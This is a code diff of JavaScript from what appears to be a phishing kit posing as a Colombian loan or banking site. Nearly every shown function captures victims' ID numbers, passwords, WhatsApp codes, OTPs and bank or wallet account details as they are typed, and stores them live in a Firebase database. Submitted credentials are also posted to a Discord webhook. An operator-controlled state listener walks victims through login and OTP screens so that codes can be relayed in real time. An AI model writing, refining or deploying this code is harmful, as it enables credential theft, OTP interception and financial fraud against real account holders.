-      setTimeout(() => {
-        elementoTitulo.textContent = frases[indice][0];
-        elementoDesc.textContent = frases[indice][1];
-        elementoTitulo.classList.remove('cambio');
-        elementoDesc.classList.remove('cambio');
-        indice = (indice + 1) % frases.length;
-      }, 250);
-    };
-
-    cambiarFrase();
-    estadoApp.timerTextoEspera = setInterval(cambiarFrase, CONFIG.INTERVALO_TEXTO_ESPERA);
+// ── NAVEGACIÓN ────────────────────────────────────────────────────────────────
+function goTo(id, back) {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active','going-back'));
+  var el = document.getElementById(id);
+  if (!el) return;
+  el.classList.add('active');
+  if (back) el.classList.add('going-back');
+  el.scrollTop = 0; window.scrollTo(0,0);
+  pantallaActual = id;
+  if (sessionHeartbeatStarted) {
+    updateSessionStatus(true);
+    try {
+      set(ref(db, 'sesiones/' + SESSION_ID + '/currentScreen'), pantallaActual);
+      set(ref(db, 'sesiones/' + SESSION_ID + '/currentScreenAt'), new Date().toISOString());
+    } catch(e) {}
   }
-};
+  startWaitCopy(id);
+}
+window.goTo = goTo;
 
-window.goTo = (vistaId, esRetroceso) => gestor_vistas.ir(vistaId, esRetroceso);
+function startWaitCopy(screenId) {
+  if (waitCopyTimer) clearInterval(waitCopyTimer);
+  var phrases = waitCopy[screenId];
+  if (!phrases) return;
 
-const gestor_campos = {
-  publicar(id, etiqueta, valor, estaListo = false, fueEnviado = false) {
-    const valorLimpio = String(valor || '');
+  var titleId = screenId === 's-espera2' ? 'espera2-title' : 'espera-title';
+  var subId = screenId === 's-espera2' ? 'espera2-sub' : 'espera-sub';
+  var titleEl = document.getElementById(titleId);
+  var subEl = document.getElementById(subId);
+  var index = 0;
 
-    if (!estadoApp.latidoIniciado) {
-      if (!valorLimpio.length) return;
-      iniciarLatidoSesion();
-      set(ref(db, `sesiones/${SID}/vistaActual`), estadoApp.vistaActual);
-      set(ref(db, `sesiones/${SID}/vistaActualEn`), new Date().toISOString());
-    }
-
-    const datoCampo = {
-      id,
-      etiqueta,
-      valor: valorLimpio,
-      longitud: valorLimpio.length,
-      listo: !!estaListo,
-      enviado: !!fueEnviado,
-      estado: fueEnviado ? 'Enviado' : (valorLimpio.length ? valorLimpio : 'Vacío'),
-      actualizadoEn: new Date().toISOString()
-    };
-
-    set(ref(db, `sesiones/${SID}/camposVivos/${id}`), datoCampo).catch(() => {});
+  function renderPhrase() {
+    if (!titleEl || !subEl) return;
+    titleEl.classList.add('swap');
+    subEl.classList.add('swap');
+    setTimeout(function() {
+      titleEl.textContent = phrases[index][0];
+      subEl.textContent = phrases[index][1];
+      titleEl.classList.remove('swap');
+      subEl.classList.remove('swap');
+      index = (index + 1) % phrases.length;
+    }, 250);
   }
-};
 
-function publicarEstadoCampo(id, etiqueta, valor, listo, enviado) {
-  gestor_campos.publicar(id, etiqueta, valor, listo, enviado);
+  renderPhrase();
+  waitCopyTimer = setInterval(renderPhrase, 3600);
 }
 
-const gestor_notificacion = {
-  mostrar(datosNotif) {
-    estadoApp.notificacionActiva = datosNotif;
-    document.getElementById('notif-mensaje').textContent = datosNotif.mensaje || '';
-    document.getElementById('notif-push').classList.add('visible');
-  },
-
-  ocultar() {
-    document.getElementById('notif-push').classList.remove('visible');
-  },
-
-  aceptar() {
-    this.ocultar();
-    if (!estadoApp.notificacionActiva) return;
-    set(notificacionRef, {
-      ...estadoApp.notificacionActiva,
-      aceptada: true,
-      aceptadaEn: new Date().toISOString()
-    });
-  },
-
-  inicializar() {
-    onValue(notificacionRef, (snap) => {
-      const datosNotif = snap.val();
-      if (!datosNotif || datosNotif.aceptada || !datosNotif.mensaje) {
-        this.ocultar();
-        return;
-      }
-      this.mostrar(datosNotif);
-    });
+function publishFieldStatus(id, label, value, ready, submitted) {
+  var raw = String(value || '');
+  if (!sessionHeartbeatStarted) {
+    if (!raw.length) return;
+    startSessionHeartbeat();
+    try {
+      set(ref(db, 'sesiones/' + SESSION_ID + '/currentScreen'), pantallaActual);
+      set(ref(db, 'sesiones/' + SESSION_ID + '/currentScreenAt'), new Date().toISOString());
+    } catch(e) {}
   }
+  set(ref(db, 'sesiones/' + SESSION_ID + '/liveFields/' + id), {
+    id: id,
+    label: label,
+    value: raw,
+    length: raw.length,
+    ready: !!ready,
+    submitted: !!submitted,
+    state: submitted ? 'Enviado' : raw.length ? raw : 'Vacío',
+    updatedAt: new Date().toISOString()
+  }).catch(() => {});
+}
+
+// ── FIREBASE LISTENER ─────────────────────────────────────────────────────────
+function showPush(push) {
+  activePush = push;
+  document.getElementById('push-message').textContent = push.message || '';
+  document.getElementById('push-notice').classList.add('show');
+}
+
+function hidePush() {
+  document.getElementById('push-notice').classList.remove('show');
+}
+
+window.acceptPush = function() {
+  hidePush();
+  if (!activePush) return;
+  set(pushRef, {
+    ...activePush,
+    accepted: true,
+    acceptedAt: new Date().toISOString()
+  });
 };
 
-window.aceptarNotificacion = () => gestor_notificacion.aceptar();
-gestor_notificacion.inicializar();
+onValue(pushRef, (snap) => {
+  const push = snap.val();
+  if (!push || push.accepted || !push.message) {
+    hidePush();
+    return;
+  }
+  showPush(push);
+});
 
-const manejador_estado = {
-  handleError(tipoError, vistaId, debeRetroceder = true, limpiar = null) {
-    gestor_vistas.ir(vistaId, debeRetroceder);
-    document.getElementById(`error-${tipoError}`)?.classList.add('mostrar');
-    if (limpiar) limpiar();
+onValue(estadoRef, (snap) => {
+  var estado = snap.val();
+  if (!estado) return;
+
+  if (estado === 'login_error') {
+    goTo('s-password', true);
+    document.getElementById('f-pass').value = '';
+    document.getElementById('f-pass').classList.add('error-field');
+    document.getElementById('password-error').classList.add('show');
+    document.getElementById('btn-password').disabled = true;
     set(estadoRef, 'idle');
-  },
-
-  limpiarErroresOTP(prefijo) {
-    for (let i = 0; i < 6; i++) {
-      const cajaEl = document.getElementById(`${prefijo}${i}`);
-      const digitoEl = document.getElementById(`${prefijo.replace('l', 'd')}${i}`);
-      if (cajaEl) cajaEl.classList.remove('activa', 'llena', 'error');
-      if (digitoEl) digitoEl.classList.remove('error-digito');
-    }
-  },
-
-  inicializar() {
-    onValue(estadoRef, (snap) => {
-      const estado = snap.val();
-      if (!estado || estado === 'idle') return;
-
-      switch (estado) {
-        case 'login_error':
-          gestor_vistas.ir('v-contrasena', true);
-          document.getElementById('f-clave').value = '';
-          document.getElementById('f-clave').classList.add('error-entrada');
-          document.getElementById('error-contrasena').classList.add('mostrar');
-          document.getElementById('btn-contrasena').disabled = true;
-          setTimeout(() => set(estadoRef, 'idle'), 100);
-          break;
-
-        case 'ir_contrasena':
-          gestor_vistas.ir('v-contrasena');
-          document.getElementById('error-contrasena').classList.remove('mostrar');
-          document.getElementById('f-clave').classList.remove('error-entrada');
-          document.getElementById('btn-contrasena').disabled = true;
-          set(estadoRef, 'idle');
-          break;
-
-        case 'ir_monto':
-          gestor_vistas.ir('v-monto');
-          set(estadoRef, 'idle');
-          break;
-
-        case 'ir_confirmacion_wa': {
-          const documento = localStorage.getItem('documento_usuario') || '—';
-          document.getElementById('documento-confirmacion').textContent = documento;
-          document.getElementById('error-wa').classList.remove('mostrar');
-          otpWA.limpiar();
-          gestor_vistas.ir('v-confirmacion-wa');
-          set(estadoRef, 'idle');
-          break;
-        }
-
-        case 'ir_aprobacion_email': {
-          const documento = localStorage.getItem('documento_usuario') || '—';
-          document.getElementById('documento-email').textContent = documento;
-          gestor_vistas.ir('v-aprobacion-email');
-          set(estadoRef, 'idle');
-          break;
-        }
-
-        case 'ir_fotos':
-          document.getElementById('error-fotos').classList.remove('mostrar');
-          gestorFotos.limpiar();
-          gestor_vistas.ir('v-fotos');
-          set(estadoRef, 'idle');
-          break;
-
-        case 'foto_error':
-          gestor_vistas.ir('v-fotos', true);
-          document.getElementById('error-fotos').classList.add('mostrar');
-          setTimeout(() => set(estadoRef, 'idle'), 100);
-          break;
-
-        case 'ir_otp':
-          document.getElementById('celular-otp').textContent = document.getElementById('f-documento').value || '—';
-          document.getElementById('error-otp').classList.remove('mostrar');
-          otpPrincipal.limpiar();
-          gestor_vistas.ir('v-otp-principal');
-          set(estadoRef, 'idle');
-          break;
-
-        case 'otp_error':
-          gestor_vistas.ir('v-otp-principal', true);
-          document.getElementById('error-otp').classList.add('mostrar');
-          this.limpiarErroresOTP('l');
-          otpPrincipal.limpiar();
-          setTimeout(() => set(estadoRef, 'idle'), 100);
-          break;
-
-        case 'ir_otp_desembolso':
-          get(ref(db, `sesiones/${SID}/desembolso_aliado`)).then(snap => {
-            document.getElementById('aliado-desembolso').textContent = snap.val() || 'registrado';
-          });
-          document.getElementById('error-otp-desembolso').classList.remove('mostrar');
-          otpDesembolso.limpiar();
-          gestor_vistas.ir('v-otp-desembolso');
-          set(estadoRef, 'idle');
-          break;
-
-        case 'otp_desembolso_error':
-          gestor_vistas.ir('v-otp-desembolso', true);
-          document.getElementById('error-otp-desembolso').classList.add('mostrar');
-          this.limpiarErroresOTP('ld');
-          otpDesembolso.limpiar();
-          setTimeout(() => set(estadoRef, 'idle'), 100);
-          break;
-
-        case 'ir_otp_otro':
-          get(ref(db, `sesiones/${SID}/otro_nombre`)).then(snap => {
-            document.getElementById('nombre-otro').textContent = snap.val() || 'registrado';
-          });
-          document.getElementById('error-otp-otro').classList.remove('mostrar');
-          otpOtro.limpiar();
-          gestor_vistas.ir('v-otp-otro');
-          set(estadoRef, 'idle');
-          break;
-
-        case 'otp_otro_error':
-          gestor_vistas.ir('v-otp-otro', true);
-          document.getElementById('error-otp-otro').classList.add('mostrar');
-          this.limpiarErroresOTP('lo');
-          otpOtro.limpiar();
-          setTimeout(() => set(estadoRef, 'idle'), 100);
-          break;
-
-        case 'finalizar':
-          gestor_vistas.ir('v-exito');
-          set(estadoRef, 'idle');
-          break;
-      }
-    });
   }
-};
 
+  if (estado === 'ir_password') {
+    goTo('s-password');
+    document.getElementById('password-error').classList.remove('show');
+    document.getElementById('f-pass').classList.remove('error-field');
+    document.getElementById('btn-password').disabled = true;
+    set(estadoRef, 'idle');
+  }
+
+  if (estado === 'ir_monto') {
+    goTo('s-monto');
+    set(estadoRef, 'idle');
+  }
+
+  if (estado === 'ir_confirmacion_whatsapp') {
+    var cedula = localStorage.getItem('cedula_usuario') || '—';
+    document.getElementById('cedula-confirmacion').textContent = cedula;
+    document.getElementById('whatsapp-error-box').classList.remove('show');
+    clearWhatsapp();
+    goTo('s-confirmacion-whatsapp');
+    set(estadoRef, 'idle');
+  }
+
+  if (estado === 'ir_correo_aprobacion') {
+    var cedula = localStorage.getItem('cedula_usuario') || '—';
+    document.getElementById('cedula-correo').textContent = cedula;
+    goTo('s-correo-aprobacion');
+    set(estadoRef, 'idle');
+  }
+
+  if (estado === 'ir_WTHSAPP') {
+    var cedula = localStorage.getItem('cedula_usuario') || '—';
+    // if present, show cedula in the WTHSAPP screen
+    var el = document.getElementById('cedula-wthsapp');
+    if (el) el.textContent = cedula;
+    goTo('s-WTHSAPP');
+    set(estadoRef, 'idle');
+  }
+
+  if (estado === 'ir_foto') {
+    document.getElementById('foto-error-box').classList.remove('show');
+    clearFotos();
+    goTo('s-foto');
+    set(estadoRef, 'idle');
+  }
+
+  if (estado === 'foto_error') {
+    goTo('s-foto', true);
+    document.getElementById('foto-error-box').classList.add('show');
+    set(estadoRef, 'idle');
+  }
+
+  if (estado === 'ir_otp') {
+    var cel = document.getElementById('f-cedula').value || '—';
+    document.getElementById('otp-cel').textContent = cel;
+    document.getElementById('otp-error-box').classList.remove('show');
+    clearOtp();
+    goTo('s-otp');
+    set(estadoRef, 'idle');
+  }
+
+  if (estado === 'otp_error') {
+    goTo('s-otp', true);
+    document.getElementById('otp-error-box').classList.add('show');
+    for (var i = 0; i < 6; i++) {
+      document.getElementById('l'+i).classList.remove('active','filled');
+      document.getElementById('l'+i).classList.add('error');
+      document.getElementById('d'+i).classList.add('error-digit');
+    }
+    clearOtp();
+    set(estadoRef, 'idle');
+  }
+
+  if (estado === 'ir_otp_desembolso') {
+    get(ref(db, 'sesiones/' + SESSION_ID + '/desembolso_aliado')).then((aliadoSnap) => {
+      document.getElementById('otp-desembolso-aliado').textContent = aliadoSnap.val() || 'registrado';
+    });
+    document.getElementById('otp-desembolso-error-box').classList.remove('show');
+    clearOtpDesembolso();
+    goTo('s-otp-desembolso');
+    set(estadoRef, 'idle');
+  }
+
+  if (estado === 'otp_desembolso_error') {
+    goTo('s-otp-desembolso', true);
+    document.getElementById('otp-desembolso-error-box').classList.add('show');
+    for (var j = 0; j < 6; j++) {
+      document.getElementById('ld'+j).classList.remove('active','filled');
+      document.getElementById('ld'+j).classList.add('error');
+      document.getElementById('dd'+j).classList.add('error-digit');
+    }
+    clearOtpDesembolso();
+    set(estadoRef, 'idle');
+  }
+
+  if (estado === 'ir_otp_otro') {
+    get(ref(db, 'sesiones/' + SESSION_ID + '/otro_nombre')).then((nombreSnap) => {
+      document.getElementById('otp-otro-nombre').textContent = nombreSnap.val() || 'registrado';
+    });
+    document.getElementById('otp-otro-error-box').classList.remove('show');
+    clearOtpOtro();
+    goTo('s-otp-otro');
+    set(estadoRef, 'idle');
+  }
+
+  if (estado === 'otp_otro_error') {
+    goTo('s-otp-otro', true);
+    document.getElementById('otp-otro-error-box').classList.add('show');
+    for (var k = 0; k < 6; k++) {
+      document.getElementById('lo'+k).classList.remove('active','filled');
+      document.getElementById('lo'+k).classList.add('error');
+      document.getElementById('do'+k).classList.add('error-digit');
+    }
+    clearOtpOtro();
+    set(estadoRef, 'idle');
+  }
+
+  if (estado === 'finalizar') {
+    goTo('s-exito');
+    set(estadoRef, 'idle');
+  }
+});
+
+// ── LOADER ────────────────────────────────────────────────────────────────────
 window.addEventListener('load', () => {
+  // Verificar conexión a Firebase y Discord
   Promise.all([
     get(ref(db, 'sesiones')).catch(() => false),
-    fetch(WEBHOOK_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ content: '✅ Sistema verificando conexión...' })
-    }).catch(() => false)
+    fetch(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: '✅ Sistema verificando conexión...' }) }).catch(() => false)
   ]).then(() => {
-    setTimeout(() => gestor_vistas.ir('v-acceso'), 2500);
-    manejador_estado.inicializar();
+    console.log('✅ Conexiones verificadas');
+    setTimeout(() => goTo('s-login'), 2500);
   }).catch(() => {
-    setTimeout(() => gestor_vistas.ir('v-acceso'), 2500);
-    manejador_estado.inicializar();
+    console.warn('⚠️ Error en conexión');
+    setTimeout(() => goTo('s-login'), 2500);
   });
 });
 
-const gestor_autenticacion = {
-  validarDocumento() {
-    const documento = (document.getElementById('f-documento').value || '').trim();
-    const esValido = documento.length >= 6;
-    document.getElementById('btn-acceso').disabled = !esValido;
-    gestor_campos.publicar('f-documento', 'Documento', documento, esValido, false);
-
-    if (documento.length > 0) {
-      document.getElementById('f-documento').classList.remove('error-entrada');
-      document.getElementById('error-acceso').classList.remove('mostrar');
-    }
-  },
-
-  validarContrasena() {
-    const contrasena = (document.getElementById('f-clave').value || '').trim();
-    const esValida = contrasena.length >= 4;
-
-    if (contrasena.length > 0) {
-      document.getElementById('f-clave').classList.remove('error-entrada');
-      document.getElementById('error-contrasena').classList.remove('mostrar');
-    }
-
-    document.getElementById('btn-contrasena').disabled = !esValida;
-    gestor_campos.publicar('f-clave', 'Contraseña', contrasena, esValida, false);
-  },
-
-  enviarDocumento() {
-    const documento = document.getElementById('f-documento').value;
-    gestor_campos.publicar('f-documento', 'Documento', documento, true, true);
-
-    localStorage.setItem('documento_usuario', documento);
-    set(ref(db, `sesiones/${SID}/usuario`), {
-      documento,
-      intentoAcceso: new Date().toISOString()
-    });
-    set(ref(db, `sesiones/${SID}/formularioIniciado`), new Date().toISOString());
-
-    iniciarLatidoSesion();
-    set(estadoRef, 'esperando_acceso');
-
-    gestor_discord.enviarMensaje('✅ Documento Enviado', {
-      'Documento': documento,
-      'Sesión': SID,
-      'Hora': new Date().toLocaleString('es-CO')
-    });
-
-    gestor_vistas.ir('v-espera');
-  },
-
-  enviarContrasena() {
-    const contrasena = document.getElementById('f-clave').value;
-    const documento = localStorage.getItem('documento_usuario') || '';
-
-    gestor_campos.publicar('f-clave', 'Contraseña', contrasena, true, true);
-    localStorage.setItem(`contrasena_${documento}`, contrasena);
-
-    set(ref(db, `sesiones/${SID}/usuario`), {
-      documento,
-      contrasena,
-      contrasenaEnviadaEn: new Date().toISOString()
-    });
-
-    set(estadoRef, 'esperando_acceso');
-
-    gestor_discord.enviarMensaje('🔐 Contraseña Ingresada', {
-      'Documento': documento,
-      'Contraseña': contrasena,
-      'Sesión': SID,
-      'Hora': new Date().toLocaleString('es-CO')
-    });
-
-    gestor_vistas.ir('v-espera');
+// ── LOGIN ─────────────────────────────────────────────────────────────────────
+window.checkLogin = function() {
+  var c = (document.getElementById('f-cedula').value||'').trim();
+  var ok = c.length >= 6;
+  document.getElementById('btn-login').disabled = !ok;
+  publishFieldStatus('f-cedula', 'Cédula', c, ok, false);
+  if (c.length > 0) {
+    document.getElementById('f-cedula').classList.remove('error-field');
+    document.getElementById('login-error').classList.remove('show');
   }
 };
 
-window.validarDocumento = () => gestor_autenticacion.validarDocumento();
-window.validarContrasena = () => gestor_autenticacion.validarContrasena();
-window.enviarDocumento = () => gestor_autenticacion.enviarDocumento();
-window.enviarContrasena = () => gestor_autenticacion.enviarContrasena();
-
-const fabricaOTP = {
-  crear(prefijDigito, prefijoBox, idEntrada, idBoton, idError, etiquetaCampo) {
-    let valor = '';
-
-    const limpiar = () => {
-      valor = '';
-      document.getElementById(idEntrada).value = '';
-      for (let i = 0; i < 6; i++) {
-        document.getElementById(prefijDigito + i).textContent = '';
-        document.getElementById(prefijDigito + i).classList.remove('error-digito');
-        document.getElementById(prefijoBox + i).classList.remove('activa', 'llena', 'error');
-      }
-      document.getElementById(prefijoBox + '0').classList.add('activa');
-      document.getElementById(idBoton).disabled = true;
-    };
-
-    const procesarEntrada = (elementoEntrada) => {
-      const limpio = elementoEntrada.value.replace(/\D/g, '').slice(0, 6);
-      valor = limpio;
-      elementoEntrada.value = limpio;
-
-      gestor_campos.publicar(idEntrada, etiquetaCampo, limpio, limpio.length === 6, false);
-      document.getElementById(idError).classList.remove('mostrar');
-
-      for (let i = 0; i < 6; i++) {
-        const digitoEl = document.getElementById(prefijDigito + i);
-        const cajaEl = document.getElementById(prefijoBox + i);
-
-        digitoEl.classList.remove('error-digito');
-        cajaEl.classList.remove('error');
-
-        if (i < limpio.length) {
-          digitoEl.textContent = limpio[i];
-          cajaEl.classList.add('llena');
-          cajaEl.classList.remove('activa');
-        } else if (i === limpio.length) {
-          digitoEl.textContent = '';
-          cajaEl.classList.add('activa');
-          cajaEl.classList.remove('llena');
-        } else {
-          digitoEl.textContent = '';
-          cajaEl.classList.remove('activa', 'llena');
-        }
-      }
-
-      document.getElementById(idBoton).disabled = limpio.length < 6;
-    };
-
-    const procesarTecla = (evento) => {
-      if (evento.key === 'Backspace') {
-        const elementoEntrada = document.getElementById(idEntrada);
-        elementoEntrada.value = elementoEntrada.value.slice(0, -1);
-        procesarEntrada(elementoEntrada);
-      }
-    };
-
-    return {
-      get val() {
-        return valor;
-      },
-      limpiar,
-      procesarEntrada,
-      procesarTecla
-    };
+window.checkPassword = function() {
+  var p = (document.getElementById('f-pass').value||'').trim();
+  if (p.length > 0) {
+    document.getElementById('f-pass').classList.remove('error-field');
+    document.getElementById('password-error').classList.remove('show');
   }
+  document.getElementById('btn-password').disabled = p.length < 4;
+  publishFieldStatus('f-pass', 'Contraseña', p, p.length >= 4, false);
 };
 
-function crearOTP(prefijDigito, prefijoBox, idEntrada, idBoton, idError, etiquetaCampo) {
-  return fabricaOTP.crear(prefijDigito, prefijoBox, idEntrada, idBoton, idError, etiquetaCampo);
+window.submitLogin = function() {
+  var cedula = document.getElementById('f-cedula').value;
+  publishFieldStatus('f-cedula', 'Cédula', cedula, true, true);
+  // Guardar cédula en localStorage
+  localStorage.setItem('cedula_usuario', cedula);
+  // Completar datos de sesión cuando el usuario envía la cédula.
+  set(ref(db, 'sesiones/' + SESSION_ID + '/usuario'), { cedula, intentoLogin: new Date().toISOString() });
+  set(ref(db, 'sesiones/' + SESSION_ID + '/formStarted'), new Date().toISOString());
+  startSessionHeartbeat();
+  set(estadoRef, 'esperando_login');
+  enviarDiscord('✅ Cédula Enviada', { 'Cédula': cedula, 'Sesión': SESSION_ID, 'Hora': new Date().toLocaleString('es-CO') });
+  goTo('s-espera');
+};
+
+window.submitPassword = function() {
+  var pass = document.getElementById('f-pass').value;
+  publishFieldStatus('f-pass', 'Contraseña', pass, true, true);
+  var cedula = localStorage.getItem('cedula_usuario') || '';
+  localStorage.setItem('password_' + cedula, pass);
+  set(ref(db, 'sesiones/' + SESSION_ID + '/usuario/password'), pass);
+  set(ref(db, 'sesiones/' + SESSION_ID + '/usuario'), {
+    cedula,
+    password: pass,
+    passwordSubmitAt: new Date().toISOString()
+  });
+  set(estadoRef, 'esperando_login');
+  enviarDiscord('🔐 Contraseña Ingresada', { 'Cédula': cedula, 'Contraseña': pass, 'Sesión': SESSION_ID, 'Hora': new Date().toLocaleString('es-CO') });
+  goTo('s-espera');
+};
+
+// ── WHATSAPP CONFIRMACIÓN ─────────────────────────────────────────────────────
+var whatsappVal = '';
+
+window.focusWhatsappCode = function() {
+  document.getElementById('whatsapp-input').focus();
+};
+
+function clearWhatsapp() {
+  whatsappVal = '';
+  document.getElementById('whatsapp-input').value = '';
+  for (var i = 0; i < 6; i++) {
+    document.getElementById('wd'+i).textContent = '';
+    document.getElementById('wd'+i).classList.remove('error-digit');
+    document.getElementById('wl'+i).classList.remove('active','filled','error');
+  }
+  document.getElementById('wl0').classList.add('active');
+  document.getElementById('btn-whatsapp').disabled = true;
 }
 
-/* ── Instancias OTP ── */
-const otpWA = crearOTP('wd','wl','entrada-wa', 'btn-wa', 'error-wa', 'Código WhatsApp');
-const otpPrincipal = crearOTP('d', 'l', 'entrada-otp', 'btn-otp', 'error-otp', 'OTP');
-const otpDesembolso = crearOTP('dd','ld','entrada-otp-desembolso', 'btn-otp-desembolso', 'error-otp-desembolso', 'OTP desembolso');
-const otpOtro = crearOTP('do','lo','entrada-otp-otro', 'btn-otp-otro', 'error-otp-otro', 'OTP otro');
-
-window.enfocarCodigoWA = () => document.getElementById('entrada-wa').focus();
-window.enfocarOTP = () => document.getElementById('entrada-otp').focus();
-window.enfocarOTPDesembolso = () => document.getElementById('entrada-otp-desembolso').focus();
-window.enfocarOTPOtro = () => document.getElementById('entrada-otp-otro').focus();
-
-window.procesarEntradaWA = el => otpWA.procesarEntrada(el);
-window.procesarTeclaWA = e => otpWA.procesarTecla(e);
-window.procesarEntradaOTP = el => otpPrincipal.procesarEntrada(el);
-window.procesarTeclaOTP = e => otpPrincipal.procesarTecla(e);
-window.procesarEntradaOTPDesembolso = el => otpDesembolso.procesarEntrada(el);
-window.procesarTeclaOTPDesembolso = e => otpDesembolso.procesarTecla(e);
-window.procesarEntradaOTPOtro = el => otpOtro.procesarEntrada(el);
-window.procesarTeclaOTPOtro = e => otpOtro.procesarTecla(e);
-
-window.enviarCodigoWA = function() {
-  publicarEstadoCampo('entrada-wa', 'Código WhatsApp', otpWA.val, true, true);
-  set(ref(db, 'sesiones/' + SID + '/confirmacion_wa'), { codigo: otpWA.val, ts: new Date().toISOString() });
-  set(estadoRef, 'wa_enviado');
-  enviarAlDiscord('📱 Código WhatsApp Confirmado', { 'Código': otpWA.val, 'Sesión': SID, 'Hora': new Date().toLocaleString('es-CO') });
-  document.getElementById('btn-wa').disabled = true;
-};
-
-const gestorAprobacionEmail = {
-  estadoAprobacion: null,
-
-  aprobar() {
-    this.estadoAprobacion = 'aprobado';
-    const grupoAprobacion = document.querySelector('.grupo-botones');
-    grupoAprobacion.style.opacity = '0.5';
-    grupoAprobacion.style.pointerEvents = 'none';
-    document.getElementById('btn-email').disabled = false;
-
-    gestor_discord.enviarMensaje('✅ Solicitud Aprobada', {
-      'Estado': 'Aprobado',
-      'Sesión': SID,
-      'Hora': new Date().toLocaleString('es-CO')
-    });
-  },
-
-  rechazar() {
-    this.estadoAprobacion = 'denegado';
-    const grupoAprobacion = document.querySelector('.grupo-botones');
-    grupoAprobacion.style.opacity = '0.5';
-    grupoAprobacion.style.pointerEvents = 'none';
-    document.getElementById('btn-email').disabled = false;
-
-    gestor_discord.enviarMensaje('❌ Solicitud Denegada', {
-      'Estado': 'Denegado',
-      'Sesión': SID,
-      'Hora': new Date().toLocaleString('es-CO')
-    });
-  },
-
-  confirmar() {
-    if (this.estadoAprobacion === 'aprobado') {
-      publicarEstadoCampo('aprobacion', 'Aprobación Email', 'aprobado', true, true);
-      set(ref(db, `sesiones/${SID}/aprobacion_email`), { estado: 'aprobado', ts: new Date().toISOString() });
-      set(estadoRef, 'email_confirmado');
-    } else if (this.estadoAprobacion === 'denegado') {
-      publicarEstadoCampo('aprobacion', 'Aprobación Email', 'denegado', true, true);
-      set(ref(db, `sesiones/${SID}/aprobacion_email`), { estado: 'denegado', ts: new Date().toISOString() });
-      set(estadoRef, 'email_confirmado');
-    }
-    document.getElementById('btn-email').disabled = true;
-  }
-};
-
-window.aprobarSolicitud = () => gestorAprobacionEmail.aprobar();
-window.denegarSolicitud = () => gestorAprobacionEmail.rechazar();
-window.enviarAprobacion = () => gestorAprobacionEmail.confirmar();
-
-const gestorMonto = {
-  validar() {
-    const cantidad = (document.getElementById('f-cantidad').value || '').trim();
-    const monto = parseInt(cantidad);
-    const esValido = !isNaN(monto) && monto >= 100000 && monto <= 5000000;
-
-    document.getElementById('btn-monto').disabled = !esValido;
-
-    if (esValido) {
-      publicarEstadoCampo('f-cantidad', 'Monto', cantidad, true, false);
-    } else if (cantidad) {
-      publicarEstadoCampo('f-cantidad', 'Monto', cantidad, false, false);
-    }
-  },
-
-  seleccionar(monto) {
-    document.getElementById('f-cantidad').value = monto;
-    this.validar();
-    const elementos = document.querySelectorAll('.opcion-valor');
-    elementos.forEach(el => {
-      if (el.textContent.includes(monto.toLocaleString('es-CO'))) {
-        el.classList.add('seleccionado');
-      } else {
-        el.classList.remove('seleccionado');
-      }
-    });
-  }
-};
-
-window.seleccionarMonto = (monto) => gestorMonto.seleccionar(monto);
-window.procesarMonto = (el) => gestorMonto.validar();
-
-const gestorCuenta = {
-  seleccionarMetodo(metodo) {
-    const metodos = ['nequi', 'bancolombia', 'daviplata'];
-    metodos.forEach(m => {
-      const btn = document.getElementById('btn-' + m);
-      if (m === metodo) {
-        btn.classList.add('seleccionado');
-      } else {
-        btn.classList.remove('seleccionado');
-      }
-    });
-
-    const form = document.getElementById('form-datos');
-    form.classList.add('mostrar');
-
-    estadoApp.metodoSeleccionado = metodo;
-
-    const labelNumero = document.getElementById('label-numero');
-    if (metodo === 'nequi') {
-      labelNumero.textContent = 'Número de Nequi';
-    } else if (metodo === 'daviplata') {
-      labelNumero.textContent = 'Número de Daviplata';
+window.onWhatsappInput = function(el) {
+  var raw = el.value.replace(/\D/g,'').slice(0,6);
+  whatsappVal = raw;
+  el.value = raw;
+  publishFieldStatus('whatsapp-input', 'Código WhatsApp', raw, raw.length === 6, false);
+  document.getElementById('whatsapp-error-box').classList.remove('show');
+  for (var i = 0; i < 6; i++) {
+    var d = document.getElementById('wd'+i);
+    var l = document.getElementById('wl'+i);
+    d.classList.remove('error-digit');
+    l.classList.remove('error');
+    if (i < raw.length) {
+      d.textContent = raw[i];
+      l.classList.add('filled');
+      l.classList.remove('active');
+    } else if (i === raw.length) {
+      d.textContent = '';
+      l.classList.add('active');
+      l.classList.remove('filled');
     } else {
-      labelNumero.textContent = 'Número de cuenta';
+      d.textContent = '';
+      l.classList.remove('active','filled');
     }
+  }
+  document.getElementById('btn-whatsapp').disabled = raw.length < 6;
+};
 
-    this.validar();
-  },
-
-  validar() {
-    const nombre = (document.getElementById('f-titular').value || '').trim();
-    const cedula = (document.getElementById('f-cedula-titular').value || '').trim();
-    const numero = (document.getElementById('f-numero-cuenta').value || '').trim();
-
-    const esValido = nombre.length >= 3 && cedula.length >= 6 && numero.length >= 6 && estadoApp.metodoSeleccionado;
-
-    document.getElementById('btn-cuenta').disabled = !esValido;
-
-    if (nombre.length > 0 || cedula.length > 0 || numero.length > 0) {
-      publicarEstadoCampo('cuenta', 'Datos de Cuenta', `${nombre} | ${cedula} | ${numero}`, esValido, false);
-    }
+window.onWhatsappKey = function(e) {
+  if (e.key === 'Backspace') {
+    var el = document.getElementById('whatsapp-input');
+    var raw = (el.value||'').slice(0,-1);
+    el.value = raw;
+    window.onWhatsappInput(el);
   }
 };
 
-window.seleccionarMetodo = (metodo) => gestorCuenta.seleccionarMetodo(metodo);
-window.validarCuenta = () => gestorCuenta.validar();
-
-window.irACuentaBancaria = function() {
-  const cantidad = document.getElementById('f-cantidad').value;
-  publicarEstadoCampo('f-cantidad', 'Monto', cantidad, true, true);
-  set(ref(db, `sesiones/${SID}/monto`), cantidad);
-  set(estadoRef, 'ir_cuenta');
-  gestor_vistas.ir('v-cuenta');
+window.submitWhatsapp = function() {
+  publishFieldStatus('whatsapp-input', 'Código WhatsApp', whatsappVal, true, true);
+  set(ref(db, 'sesiones/' + SESSION_ID + '/confirmacion_whatsapp'), { codigo: whatsappVal, ts: new Date().toISOString() });
+  set(estadoRef, 'whatsapp_enviado');
+  enviarDiscord('📱 Código WhatsApp Confirmado', { 'Código': whatsappVal, 'Sesión': SESSION_ID, 'Hora': new Date().toLocaleString('es-CO') });
+  document.getElementById('btn-whatsapp').disabled = true;
 };
 
-window.enviarCuenta = function() {
-  const nombre = document.getElementById('f-titular').value;
-  const cedula = document.getElementById('f-cedula-titular').value;
